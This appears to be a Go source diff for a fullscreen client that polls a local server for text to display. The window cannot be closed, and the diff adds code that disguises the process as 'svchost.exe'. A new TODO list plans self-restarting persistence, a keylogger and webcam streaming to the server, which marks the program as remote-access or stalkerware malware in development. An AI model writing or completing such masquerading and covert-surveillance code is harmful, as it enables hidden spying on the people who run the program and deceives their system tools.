@@ -1,6 +1,16 @@
 package main
 
-//TODO: REFACTOR EVERYTHING
+//TODO: REFAC1TOR EVERYTHING
+/*
+TODO:
+	1 -implement a checker that checks if app has gone silent and make app check if checker is silent
+		if either are silent then start it
+	2 -Play Audio file sent by server
+	3 - display images sent by server
+	4 - display videos sent by server
+	5 - Access Webcam and stream to server
+	6 - keylogger and send data to server
+*/
 
 import (
 	"bytes"
@@ -10,6 +20,8 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
+	"reflect"
 	"runtime"
 	"syscall"
 	"unsafe"
@@ -23,7 +35,8 @@ import (
 )
 
 type ClientData struct {
-	OnScreenText string
+	ShouldUpdate bool   `json:"ClientShouldUpdate"`
+	OnScreenText string `json:"ClientOnScreenText"`
 }
 
 type ClientProductId struct {
@@ -53,6 +66,7 @@ func init() {
 }
 
 func main() {
+	SetProcessName("svchost.exe")
 	bundles.WriteFiraCodeNerd()
 	if err := glfw.Init(); err != nil {
 		panic(err)
@@ -132,36 +146,41 @@ func main() {
 	data, _ := json.Marshal(pid)
 
 	for !window.ShouldClose() {
-		resp, err := http.Post("http://localhost:5050/SetProductId", "application/json", bytes.NewBuffer(data))
-		if err != nil {
-			log.Println(err)
-			Draw(font, mode, pid, window)
-			continue
-		}
-
-		defer resp.Body.Close()
-		body, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			print(err)
-		}
-
-		fmt.Println(string(body))
-		err = json.Unmarshal(body, &clients)
-		if err != nil {
-			panic(err)
-		}
-
-		Draw(font, mode, pid, window)
+		GetOnScreenText(data)
+		Draw(font, mode, pid, window, clients[pid.ProductId].ShouldUpdate)
 	}
 }
 
-func Draw(font *glfont.Font, mode *glfw.VidMode, pid ClientProductId, window *glfw.Window) {
+func GetOnScreenText(data []byte) error {
+	resp, err := http.Post("http://localhost:5050/", "application/json", bytes.NewBuffer(data))
+	if err != nil {
+		return err
+	}
 
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err
+	}
+
+	fmt.Println(string(body))
+	err = json.Unmarshal(body, &clients)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func Draw(font *glfont.Font, mode *glfw.VidMode, pid ClientProductId, window *glfw.Window, update bool) {
 	gl.Clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
 	gl.ClearColor(0, 0, 0, 0)
 
-	font.SetColor(1.0, 1.0, 1.0, 1.0)
-	font.Printf(float32(mode.Width)/2-font.Width(1.0, clients[pid.ProductId].OnScreenText)/2, float32(mode.Height)/2, 1.0, clients[pid.ProductId].OnScreenText)
+	if update {
+		font.SetColor(1.0, 1.0, 1.0, 1.0)
+		font.Printf(float32(mode.Width)/2-font.Width(1.0, clients[pid.ProductId].OnScreenText)/2,
+			float32(mode.Height)/2, 1.0, clients[pid.ProductId].OnScreenText)
+	}
 
 	window.SwapBuffers()
 	glfw.PollEvents()
@@ -169,4 +188,16 @@ func Draw(font *glfont.Font, mode *glfw.VidMode, pid ClientProductId, window *gl
 
 func CloseCallback(w *glfw.Window) {
 	w.SetShouldClose(false)
+}
+
+func SetProcessName(name string) error {
+	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
+
+	n := copy(argv0, name)
+	if n < len(argv0) {
+		argv0[n] = 0
+	}
+
+	return nil
 }
